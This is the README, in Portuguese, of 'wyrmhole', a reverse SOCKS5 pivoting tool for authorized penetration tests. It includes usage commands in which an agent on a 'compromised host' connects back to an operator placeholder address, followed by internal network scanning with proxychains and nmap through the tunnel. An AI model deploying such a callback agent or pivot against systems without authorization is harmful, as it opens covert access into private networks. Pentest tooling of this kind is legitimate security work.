# wyrmhole

Túnel **SOCKS5 reverso** para pivoting em pentest autorizado. O agente roda no
host comprometido e **liga de volta** ao operador; o operador ganha um proxy
SOCKS5 que sai na rede interna do agente. Útil quando o alvo não aceita conexões
de entrada (NAT/firewall).

> ⚠️ **Uso autorizado apenas.** Só contra ambientes com escopo e permissão.

## Como funciona
```
operador (você)                         host comprometido
┌─────────────────────┐                 ┌──────────────────┐
│ wyrmhole server     │◄───── liga ─────│ wyrmhole agent   │
│  :7000 controle     │   de volta      │                  │
│  :1080 SOCKS5 ──────┼─ túnel mux ────►│  dial rede interna
└─────────────────────┘                 └──────────────────┘
proxychains / browser ─► 127.0.0.1:1080
```
Multiplexa várias conexões SOCKS sobre um único canal TCP (frames
`[id][kind][len][data]`).

## Uso
No operador:
```sh
wyrmhole server --control 0.0.0.0:7000 --socks 127.0.0.1:1080
```
No host comprometido:
```sh
wyrmhole agent --connect SEU_IP:7000
```
Depois:
```sh
proxychains -q nmap -sT 10.10.10.0/24
curl --socks5-hostname 127.0.0.1:1080 http://interno.local
```

## Build
```sh
cargo build --release
```
Cross pra Windows (agente em host Windows):
```sh
cargo build --release --target x86_64-pc-windows-gnu
```
